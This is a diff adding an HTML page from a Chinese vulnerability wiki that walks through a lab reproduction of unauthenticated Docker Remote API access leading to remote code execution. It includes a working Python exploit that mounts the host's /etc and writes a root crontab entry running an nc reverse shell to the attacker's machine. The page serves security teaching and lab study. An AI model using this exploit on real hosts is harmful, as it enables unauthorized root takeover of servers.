@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Docker/unauthorized-rce/README.zh-cn/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Docker Remote API 未授权访问导致远程代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Docker Remote API \u672a\u6388\u6743\u8bbf\u95ee\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../DockerUI/DockerUI%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../DockerUI/DockerUI%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DockerUI存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        Docker Remote API Unauthorized Access Leads to Remote Code Execution
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="docker-remote-api">Docker Remote API 未授权访问导致远程代码执行<a class="headerlink" href="#docker-remote-api" title="Permanent link">&para;</a></h1>
+<p>Docker是一个提供容器化软件打包和交付的平台即服务（PaaS）解决方案。Docker守护进程（dockerd）提供了一个REST API，允许远程管理Docker容器、镜像和其他资源。</p>
+<p>当Docker守护进程被配置为监听网络端口（通常是TCP端口2375）且未启用适当的身份验证机制时，攻击者可以未经授权访问Docker API。利用此漏洞，攻击者可以在主机系统上创建、修改和执行容器，可能导致远程代码执行、数据窃取以及完全控制主机系统。</p>
+<ul>
+<li><a href="https://docs.docker.com/engine/security/protect-access/">https://docs.docker.com/engine/security/protect-access/</a></li>
+<li><a href="https://tttang.com/archive/357/">https://tttang.com/archive/357/</a></li>
+</ul>
+<h2 id="_1">环境搭建<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>执行以下命令启动存在漏洞的Docker环境：</p>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<p>环境启动后，Docker守护进程将在2375端口上监听，且不需要任何身份验证。</p>
+<h2 id="_2">漏洞复现<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>这个漏洞可以使用Python的docker-py库进行利用。攻击方法是创建一个新容器并挂载主机的/etc目录，这样攻击者就能修改系统关键文件。在这个示例中，我们将通过添加一个恶意的crontab条目来创建反弹shell，以演示漏洞的危害。</p>
+<p>首先，安装所需的Python库：</p>
+<div class="highlight"><pre><span></span><code>pip install docker
+</code></pre></div>
+<p>然后创建并运行以下Python脚本来利用漏洞：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">docker</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&quot; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
+</code></pre></div>
+<p>这个脚本创建了一个容器，挂载主机的/etc目录，并向root用户的crontab添加一个反弹shell命令。在一分钟内，cron守护进程将执行该命令，建立一个反弹shell连接到攻击者的机器。</p>
+<p>成功利用漏洞后，可以收到反弹shell连接：</p>
+<p><img alt="反弹Shell利用" src="../1.png" /></p>
+<p>这个漏洞展示了正确保护Docker守护进程访问和为远程API端点实施身份验证机制的重要性。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../DockerUI/DockerUI%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../DockerUI/DockerUI%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DockerUI存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        Docker Remote API Unauthorized Access Leads to Remote Code Execution
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
